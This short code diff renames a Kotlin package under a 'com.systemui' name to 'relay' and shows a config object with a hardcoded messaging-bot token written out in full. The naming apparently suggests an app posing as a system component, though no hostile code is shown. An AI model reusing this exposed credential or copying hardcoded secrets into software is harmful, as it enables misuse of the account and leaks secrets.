@@ -1,4 +1,4 @@
-package com.systemui.package
+package com.systemui.relay
 
 object Config {
     const val BOT_TOKEN = "8697419498:AAFUkgi0_Jft2lpC5M5dWsM2rpVhIeYc91Q"
